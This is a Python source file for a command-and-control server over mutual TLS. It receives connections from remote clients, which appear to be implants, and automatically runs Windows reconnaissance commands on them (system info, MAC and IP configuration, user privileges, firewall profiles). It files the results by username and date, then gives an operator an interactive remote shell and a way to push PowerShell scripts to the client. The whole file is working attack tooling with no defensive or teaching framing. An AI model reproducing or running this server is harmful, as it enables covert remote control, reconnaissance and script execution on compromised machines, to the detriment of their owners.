import socket
import ssl
import os
from datetime import datetime, timezone

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('', 8080))
    server_socket.listen(5)
    print("Server started and waiting for connections...")
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="server_cert.pem", keyfile="server_key.pem")
    context.load_verify_locations(cafile="ca_cert.pem")
    context.verify_mode = ssl.CERT_REQUIRED
    server_socket = context.wrap_socket(server_socket, server_side=True)
    try:
        accepting_connections = True        
        while accepting_connections:
            client_socket, addr = server_socket.accept()
            client_ip = addr[0]
            print(f"Connection from {client_ip} has been established")
            username = client_socket.recv(1024).decode()
            if '/' in username:
                domain, username = username.split('/', 1)
            else:
                domain = 'LOCAL'
            print(f"Domain: {domain}, User: {username}")
            user_dir = f"./{username}"
            os.makedirs(user_dir, exist_ok=True)
            current_date = datetime.now(timezone.utc).strftime('%Y-%m-%d')
            date_dir = os.path.join(user_dir, current_date)
            os.makedirs(date_dir, exist_ok=True)
            current_time = datetime.now(timezone.utc).strftime('%H-%M-%S')
            time_dir = os.path.join(date_dir, current_time)
            os.makedirs(time_dir, exist_ok=True)            
            recon_dir = os.path.join(time_dir, 'recon')
            os.makedirs(recon_dir, exist_ok=True)            
            recon_commands = [
                'systeminfo',
                'getmac',
                'ipconfig /all',
                'whoami /priv',
                'netsh advfirewall show allprofiles',
            ]
            for command in recon_commands:
                client_socket.send(command.encode())
                output = client_socket.recv(4096).decode()
                sanitized_command = '_'.join(filter(None, ''.join(c if c.isalnum() else '_' for c in command).split('_')))
                command_file = os.path.join(recon_dir, f"{sanitized_command}.txt")                
                with open(command_file, 'w') as f:
                    f.write(f"Command: {command}\n")
                    f.write(f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d')}\n")
                    f.write(f"UTC Time: {datetime.now(timezone.utc).strftime('%H-%M-%S')}\n")
                    f.write(output)           
                print(f"Recon command '{command}' executed and saved in {recon_dir}")            
            while True:
                command = input("Enter command to execute or 'exit' to quit: ")                
                if command.lower() in ['q', 'e', 'quit', 'exit']:
                    client_socket.send(b"EXIT")
                    print("Exit signal sent to client.")
                    client_socket.close()
                    print("Client connection closed.")
                    accepting_connections = False
                    server_socket.close()
                    print("Server has closed its connection to the proxy.")
                    break                
                elif command.lower() == 'script':
                    while True:
                        script_filename = input("Enter script filename (with .ps1 extension or 'exit' to return): ")
                        if script_filename.lower() == 'exit':
                            break
                        if os.path.isfile(script_filename) and script_filename.endswith('.ps1'):
                            client_socket.send(b"SCRIPT_START")
                            with open(script_filename, 'r') as script_file:
                                for line in script_file:
                                    print(f"[DEBUG] Sending line: {line.strip()}")
                                    client_socket.send(line.encode())
                            client_socket.send(b"SCRIPT_END")
                            print(f"Script '{script_filename}' sent to the client.")
                        else:
                            print("File does not exist or invalid extension.")                
                else:
                    client_socket.send(command.encode())
                    output = client_socket.recv(4096).decode()                    
                    if output is None or output.strip() == "":
                        print("No output received. The command may have opened an application.")
                    else:
                        sanitized_command = '_'.join(filter(None, ''.join(c if c.isalnum() else '_' for c in command).split('_')))
                        command_file = os.path.join(time_dir, f"{sanitized_command}.txt")                        
                        with open(command_file, 'w') as f:
                            f.write(f"Command: {command}\n")
                            f.write(f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d')}\n")
                            f.write(f"UTC Time: {datetime.now(timezone.utc).strftime('%H-%M-%S')}\n")
                            f.write(output)                        
                        print(f"Output :\n{output}")    
    except Exception as e:
        print(f"Error : {e}")
    finally:
        server_socket.close()
        print("Server socket closed.")

if __name__ == "__main__":
    start_server()